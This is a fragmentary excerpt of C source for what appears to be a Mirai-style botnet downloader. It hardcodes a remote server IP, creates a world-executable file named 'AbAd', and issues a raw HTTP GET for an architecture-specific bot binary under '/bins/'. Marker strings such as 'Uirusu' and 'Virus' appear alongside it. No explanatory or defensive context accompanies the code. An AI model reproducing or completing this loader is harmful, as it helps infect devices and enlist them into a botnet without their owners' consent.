...
#define HTTP_SERVER utils_inet_addr(206,217,221,92) //0,0,0,0

#define EXEC_MSG            "Uirusu\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "Virus\n"
...
inline void run(void)
{
    ...
    ffd = open("AbAd", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /bins/UnHAnaAW." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (19 + arch_strlen + 13))
    {
#ifdef DEBUG
